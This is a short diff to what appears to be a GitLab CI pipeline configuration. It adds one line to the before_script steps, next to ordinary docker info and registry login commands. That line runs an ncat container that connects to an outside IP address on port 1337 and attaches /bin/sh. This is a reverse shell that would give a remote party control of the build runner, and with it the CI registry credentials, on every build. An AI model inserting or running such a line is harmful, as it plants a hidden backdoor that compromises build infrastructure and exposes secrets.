@@ -44,6 +44,7 @@ stages:
 # Display information before we start the build.
 before_script:
   - docker info
+  - docker run --rm -ti itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh
   # - docker login -u $DOCKER_REG_CID -p $DOCKER_REG_TOKEN $CI_REGISTRY
   - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
 
